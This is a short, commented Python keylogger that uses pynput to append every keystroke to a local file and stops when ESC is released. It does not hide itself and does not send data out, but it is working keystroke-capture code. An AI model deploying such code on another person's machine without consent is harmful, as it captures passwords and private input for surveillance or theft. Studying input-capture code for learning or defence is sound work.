# Import necessary modules from the pynput library
from pynput.keyboard import Key, Listener

# Specify the file where keystrokes will be saved
log_file = "key_log.txt"

# Define a function that handles key presses
def on_press(key):
    # Open the file in append mode
    with open(log_file, "a") as f:
        try:
            # Try to write the key character to the file (for letters, numbers, etc.)
            f.write(key.char)
        except AttributeError:
            # If the key has no character (e.g., special keys), write its name instead
            f.write(f"[{key}]")

# Define a function to handle key release (optional)
def on_release(key):
    # Stop the listener if the ESC key is released
    if key == Key.esc:
        return False

# Set up the listener to monitor keyboard input
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
